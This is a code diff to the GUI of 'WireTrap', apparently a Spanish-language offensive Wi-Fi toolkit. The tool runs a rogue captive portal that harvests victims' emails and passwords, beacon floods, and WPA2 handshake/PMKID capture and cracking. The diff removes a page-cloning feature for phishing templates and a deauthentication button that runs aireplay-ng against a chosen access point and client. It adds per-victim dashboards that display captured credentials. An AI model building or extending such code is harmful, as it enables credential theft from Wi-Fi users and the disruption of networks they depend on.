@@ -45,8 +45,6 @@ class SignalBridge(QObject):
     cp_sniff_data    = pyqtSignal(object)   # CapturedData post-login
     cp_started       = pyqtSignal()
     cp_stopped       = pyqtSignal()
-    cp_clone_ok      = pyqtSignal()
-    cp_clone_fail    = pyqtSignal()
 
 
 # ── Ventana principal ─────────────────────────────────────────
@@ -76,6 +74,7 @@ class WireTrap(QMainWindow):
         self.engine   = DecisionEngine()
 
         self.dashboards = []
+        self.cp_dashboards = []
 
         # Bridge de señales
         self.bridge = SignalBridge()
@@ -93,8 +92,6 @@ class WireTrap(QMainWindow):
         self.bridge.flood_stopped.connect(self._on_flood_stopped)
         self.bridge.flood_error.connect(lambda msg: self._flood_log(f"[!] {msg}"))
         self.bridge.cp_log.connect(self._on_cp_log)
-        self.bridge.cp_clone_ok.connect(self._on_clone_success)
-        self.bridge.cp_clone_fail.connect(self._on_clone_error)
         self.bridge.cp_credential.connect(self._on_cp_credential)
         self.bridge.cp_sniff_data.connect(self._on_cp_sniff_data)
         self.bridge.cp_started.connect(self._on_cp_started)
@@ -275,14 +272,13 @@ class WireTrap(QMainWindow):
         opts_layout.addWidget(tpl_label)
         self.cp_template_combo = QComboBox()
         self.cp_template_combo.addItems([
-            "Google", "Personalizada (URL)", "Personalizada (archivo HTML)"
+            "Google", "Personalizada (archivo HTML)"
         ])
         self.cp_template_combo.setFont(QFont("Monospace", 10))
         opts_layout.addWidget(self.cp_template_combo)
 
         tpl_hint = QLabel(
             "  Google → página estilo Google\n"
-            "  URL → clonar una web real\n"
             "  Archivo HTML → usar un .html propio"
         )
         tpl_hint.setFont(QFont("Monospace", 8))
@@ -293,34 +289,6 @@ class WireTrap(QMainWindow):
         sep.setFrameShape(QFrame.Shape.HLine)
         sep.setStyleSheet("color: #333;")
         opts_layout.addWidget(sep)
-
-        # URL para plantilla personalizada (visible solo cuando se elige "Personalizada (URL)")
-        self.cp_url_label = QLabel("URL a clonar:")
-        self.cp_url_label.setFont(QFont("Monospace", 10))
-        self.cp_url_input = QLineEdit()
-        self.cp_url_input.setFont(QFont("Monospace", 9))
-        self.cp_url_input.setPlaceholderText("https://login.ejemplo.com/wifi")
-        self.btn_cp_clone = QPushButton("🔗 Clonar Plantilla")
-        self.btn_cp_clone.setFont(QFont("Monospace", 9, QFont.Weight.Bold))
-        self.btn_cp_clone.setStyleSheet(
-            "QPushButton { background: #1a0d00; border: 1px solid #ff8800; color: #ff8800; padding: 4px 8px; border-radius: 4px; }"
-            "QPushButton:hover { background: #ff8800; color: black; }"
-        )
-        self.btn_cp_clone.clicked.connect(self._on_cp_clone_clicked)
-        self.cp_clone_status = QLabel("")
-        self.cp_clone_status.setFont(QFont("Monospace", 8))
-        self.cp_clone_status.setStyleSheet("color: #888888;")
-        self.cp_clone_status.setWordWrap(True)
-
-        self.cp_url_label.setVisible(False)
-        self.cp_url_input.setVisible(False)
-        self.btn_cp_clone.setVisible(False)
-        self.cp_clone_status.setVisible(False)
-
-        opts_layout.addWidget(self.cp_url_label)
-        opts_layout.addWidget(self.cp_url_input)
-        opts_layout.addWidget(self.btn_cp_clone)
-        opts_layout.addWidget(self.cp_clone_status)
 
         # Archivo HTML propio (visible solo cuando se elige "Personalizada (archivo HTML)")
         self.cp_file_label = QLabel("Archivo HTML:")
@@ -352,12 +320,7 @@ class WireTrap(QMainWindow):
         opts_layout.addWidget(self.cp_file_status)
 
         def _on_template_changed(text):
-            is_url    = (text == "Personalizada (URL)")
             is_file   = (text == "Personalizada (archivo HTML)")
-            self.cp_url_label.setVisible(is_url)
-            self.cp_url_input.setVisible(is_url)
-            self.btn_cp_clone.setVisible(is_url)
-            self.cp_clone_status.setVisible(is_url)
             self.cp_file_label.setVisible(is_file)
             self.cp_file_path_display.setVisible(is_file)
             self.btn_cp_browse_file.setVisible(is_file)
@@ -537,6 +500,7 @@ class WireTrap(QMainWindow):
             "background: #0d0d0d; color: #ff8800; "
             "gridline-color: #333; selection-background-color: #331a00;"
         )
+        self.cp_creds_table.cellDoubleClicked.connect(self._on_cp_creds_table_double_click)
         creds_layout.addWidget(self.cp_creds_table)
 
         # Exportar
@@ -652,6 +616,35 @@ class WireTrap(QMainWindow):
         self.cp_lbl_count.setText(f"{count} credencial{'es' if count != 1 else ''} capturada{'s' if count != 1 else ''}")
         self.btn_cp_export.setEnabled(True)
 
+        # Reenviar a cualquier dashboard individual abierto para esta IP
+        self.cp_dashboards = [d for d in self.cp_dashboards if d.isVisible()]
+        for dash in self.cp_dashboards:
+            dash.on_credential_captured(entry)
+
+    def _on_cp_creds_table_double_click(self, row, column):
+        ip_item = self.cp_creds_table.item(row, 1)
+        if ip_item:
+            self._open_cp_client_dashboard(ip_item.text())
+
+    def _open_cp_client_dashboard(self, ip):
+        dash = DashboardDialog(target_ip=ip, parent=self)
+
+        # Precargar con lo ya capturado en las tablas de esta sesión
+        for row in range(self.cp_creds_table.rowCount()):
+            row_ip = self.cp_creds_table.item(row, 1)
+            if row_ip and row_ip.text() == ip:
+                entry = {
+                    "timestamp": self.cp_creds_table.item(row, 0).text() if self.cp_creds_table.item(row, 0) else "",
+                    "ip":        ip,
+                    "host":      self.cp_creds_table.item(row, 2).text() if self.cp_creds_table.item(row, 2) else "",
+                    "email":     self.cp_creds_table.item(row, 3).text() if self.cp_creds_table.item(row, 3) else "",
+                    "password":  self.cp_creds_table.item(row, 4).text() if self.cp_creds_table.item(row, 4) else "",
+                }
+                dash.on_credential_captured(entry)
+
+        self.cp_dashboards.append(dash)
+        dash.show()
+
     def _on_cp_started(self):
         self.cp_status_label.setText("● ACTIVO")
         self.cp_status_label.setStyleSheet("color: #ff8800; font-weight: bold;")
@@ -660,8 +653,6 @@ class WireTrap(QMainWindow):
         self.cp_ssid_input.setEnabled(False)
         self.cp_channel_combo.setEnabled(False)
         self.cp_template_combo.setEnabled(False)
-        self.cp_url_input.setEnabled(False)
-        self.btn_cp_clone.setEnabled(False)
         self.btn_cp_browse_file.setEnabled(False)
         self.cp_iface_combo.setEnabled(False)
         self.cp_out_iface_combo.setEnabled(False)
@@ -674,56 +665,10 @@ class WireTrap(QMainWindow):
         self.cp_ssid_input.setEnabled(True)
         self.cp_channel_combo.setEnabled(True)
         self.cp_template_combo.setEnabled(True)
-        self.cp_url_input.setEnabled(True)
-        self.btn_cp_clone.setEnabled(True)
         self.btn_cp_browse_file.setEnabled(True)
         self.cp_iface_combo.setEnabled(True)
         self.cp_out_iface_combo.setEnabled(True)
         self._cp_log("Portal detenido.")
-
-    def _on_cp_clone_clicked(self):
-        """Clona la URL indicada y la guarda en el CaptivePortal temporal."""
-        url = self.cp_url_input.text().strip()
-        if not url:
-            QMessageBox.warning(self, "Error", "Introduce una URL válida.")
-            return
-        if not url.startswith(("http://", "https://")):
-            url = "https://" + url
-            self.cp_url_input.setText(url)
-
-        self.btn_cp_clone.setEnabled(False)
-        self.cp_clone_status.setText("⏳ Clonando página... (puede tardar unos segundos)")
-        self.cp_clone_status.setStyleSheet("color: #ffcc00;")
-
-        # Crear un CaptivePortal temporal solo para la clonación
-        from core.captive_portal import CaptivePortal as _CP
-        iface = self.cp_iface_combo.currentText() or "wlan0"
-        self._clone_portal = _CP(iface)
-        self._clone_portal.on_log = lambda m: self.bridge.cp_log.emit(m)
-        self._clone_portal.on_error = lambda m: self.bridge.cp_log.emit(f"[!] {m}")
-
-        def _do_clone():
-            ok = self._clone_portal.clone_template(url)
-            # Volver al hilo GUI
-            if ok:
-                self.bridge.cp_log.emit(f"[+] Plantilla clonada desde {url}")
-                self.bridge.cp_clone_ok.emit()
-            else:
-                self.bridge.cp_clone_fail.emit()
-
-        import threading
-        threading.Thread(target=_do_clone, daemon=True).start()
-
-    def _on_clone_success(self):
-        self.cp_clone_status.setText("✅ Plantilla clonada correctamente")
-        self.cp_clone_status.setStyleSheet("color: #00ff88;")
-        self.btn_cp_clone.setEnabled(True)
-
-    def _on_clone_error(self):
-        self.cp_clone_status.setText("❌ Error al clonar. Revisa la URL y el log.")
-        self.cp_clone_status.setStyleSheet("color: #ff4444;")
-        self.btn_cp_clone.setEnabled(True)
-        self._clone_portal = None
 
     def _on_cp_browse_file_clicked(self):
         """Carga un .html propio del disco como plantilla de login, en vez
@@ -772,8 +717,8 @@ class WireTrap(QMainWindow):
         if template == "custom":
             if not hasattr(self, "_clone_portal") or not self._clone_portal or not self._clone_portal.custom_html:
                 QMessageBox.warning(self, "Plantilla no lista",
-                                    "Primero debes clonar una URL ('🔗 Clonar Plantilla') o "
-                                    "cargar un archivo HTML propio ('📁 Seleccionar archivo...').")
+                                    "Primero debes cargar un archivo HTML propio "
+                                    "('📁 Seleccionar archivo...').")
                 return
 
         # Limpiar tablas previas
@@ -840,6 +785,11 @@ class WireTrap(QMainWindow):
             self.cp_sniff_table.setItem(row, col, item)
         self.cp_sniff_table.scrollToBottom()
 
+        # Reenviar a cualquier dashboard individual abierto para esta IP
+        self.cp_dashboards = [d for d in self.cp_dashboards if d.isVisible()]
+        for dash in self.cp_dashboards:
+            dash.on_data_captured(data)
+
     def _on_cp_stop_clicked(self):
         if self.captive_portal:
             import threading
@@ -896,30 +846,9 @@ class WireTrap(QMainWindow):
         line.setStyleSheet("color: #444;")
         layout.addWidget(line)
 
-        # Panel central: opciones + log + stats
-        center = QHBoxLayout()
-
-        # ── Opciones ──────────────────────────────────────────
-        opts_group = QGroupBox("CONFIGURACIÓN")
-        opts_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
-        opts_group.setFixedWidth(340)
-        opts_layout = QVBoxLayout(opts_group)
-        opts_layout.setSpacing(18)
-
-        # Canal (rotación 1/6/11), velocidad (500 pkt/s) y mezcla de SSIDs
-        # reales son fijos de fábrica — no configurables desde la GUI.
-        opts_layout.addStretch()
-
-        # Anunciar WPA2
-        self.flood_chk_wpa2 = QCheckBox(" Anunciar como WPA2\n (aparece con 🔒)")
-        self.flood_chk_wpa2.setFont(QFont("Monospace", 10))
-        self.flood_chk_wpa2.setChecked(True)
-        self.flood_chk_wpa2.setStyleSheet("color: #ffaa00;")
-        opts_layout.addWidget(self.flood_chk_wpa2)
-
-        center.addWidget(opts_group)
-
-        # ── Panel derecho: stats + log ─────────────────────────
+        # Panel central: estadísticas + log (sin panel de configuración:
+        # canal/velocidad/rotación son fijos de fábrica, y el único ajuste
+        # que queda -anunciar como WPA2- vive junto al botón de inicio)
         right_layout = QVBoxLayout()
 
         # Stats
@@ -957,11 +886,20 @@ class WireTrap(QMainWindow):
         log_layout_inner.addWidget(self.flood_log)
         right_layout.addWidget(log_group)
 
-        center.addLayout(right_layout)
-        layout.addLayout(center, 1)
+        layout.addLayout(right_layout, 1)
 
         # Botones
         btn_row = QHBoxLayout()
+
+        # Único ajuste configurable: anunciar o no como WPA2 (🔒).
+        # Ubicado junto al botón de inicio, que es cuando realmente importa.
+        self.flood_chk_wpa2 = QCheckBox(" Anunciar como WPA2 (🔒)")
+        self.flood_chk_wpa2.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
+        self.flood_chk_wpa2.setChecked(True)
+        self.flood_chk_wpa2.setStyleSheet("color: #ffaa00;")
+        btn_row.addWidget(self.flood_chk_wpa2)
+        btn_row.addStretch()
+
         self.btn_flood_start = QPushButton("📡  Iniciar Beacon Flood")
         self.btn_flood_start.setFixedHeight(44)
         self.btn_flood_start.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
@@ -1885,12 +1823,6 @@ class WireTrap(QMainWindow):
         self.btn_wpa2_start.setStyleSheet("background-color: #00aa44; color: black; padding: 10px;")
         self.btn_wpa2_start.clicked.connect(self._start_wpa2_attack)
 
-        self.btn_wpa2_deauth = QPushButton("💥 FORZAR DEAUTH (HANDSHAKE)")
-        self.btn_wpa2_deauth.setFont(header_font)
-        self.btn_wpa2_deauth.setStyleSheet("background-color: #ffaa00; color: black; padding: 10px;")
-        self.btn_wpa2_deauth.setEnabled(False)
-        self.btn_wpa2_deauth.clicked.connect(self._on_wpa2_deauth_clicked)
-
         self.btn_wpa2_stop = QPushButton("🛑 DETENER CAZA")
         self.btn_wpa2_stop.setFont(header_font)
         self.btn_wpa2_stop.setStyleSheet("background-color: #aa0000; color: white; padding: 10px;")
@@ -1898,7 +1830,6 @@ class WireTrap(QMainWindow):
         self.btn_wpa2_stop.clicked.connect(self._stop_wpa2_attack)
 
         btn_layout.addWidget(self.btn_wpa2_start)
-        btn_layout.addWidget(self.btn_wpa2_deauth)
         btn_layout.addWidget(self.btn_wpa2_stop)
         log_layout.addLayout(btn_layout)
 
@@ -1930,32 +1861,6 @@ class WireTrap(QMainWindow):
             self.wpa2_status.setStyleSheet("color: #00ff88; font-weight: bold;")
             self.wpa2_ap_table.setRowCount(0)
             self.selected_ap = None
-
-    def _on_wpa2_deauth_clicked(self):
-        if not self.selected_ap: return
-        iface = self.wpa2_iface_combo.currentText()
-
-        ap = self.scanner.aps.get(self.selected_ap.bssid)
-        client_mac = "FF:FF:FF:FF:FF:FF"
-        target_name = "la red entera (Broadcast)"
-
-        if ap and len(ap.clients) > 0:
-            client_mac = list(ap.clients)[0]
-            target_name = f"al cliente {client_mac}"
-
-        self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando a {target_name} de {self.selected_ap.bssid} para forzar handshakes...")
-
-        def run_deauth():
-            import subprocess
-            try:
-                subprocess.run([
-                    "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, "-c", client_mac, iface
-                ], capture_output=True, timeout=10)
-            except Exception:
-                pass
-
-        import threading
-        threading.Thread(target=run_deauth, daemon=True).start()
 
     def _on_wpa2_ap_selected(self):
         row = self.wpa2_ap_table.currentRow()
@@ -1994,7 +1899,6 @@ class WireTrap(QMainWindow):
         self.wpa2_status.setStyleSheet("color: #e94560; font-weight: bold;")
         self.btn_wpa2_start.setEnabled(False)
         self.btn_wpa2_stop.setEnabled(True)
-        self.btn_wpa2_deauth.setEnabled(True)
 
     def _stop_wpa2_attack(self):
         if self.wpa2_engine:
@@ -2003,14 +1907,12 @@ class WireTrap(QMainWindow):
         self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
         self.btn_wpa2_start.setEnabled(True)
         self.btn_wpa2_stop.setEnabled(False)
-        self.btn_wpa2_deauth.setEnabled(False)
 
     def _on_pmkid_success(self, file_path):
         self.log_wpa2(f"🏆 ¡Hash procesado con éxito!")
         self.wpa2_status.setText("● CRACKEANDO")
         self.wpa2_status.setStyleSheet("color: #ffaa00; font-weight: bold;")
         self.btn_wpa2_stop.setEnabled(False)
-        self.btn_wpa2_deauth.setEnabled(False)
 
     def _on_pmkid_error(self, error):
         self.log_wpa2(f"❌ Error crítico: {error}")
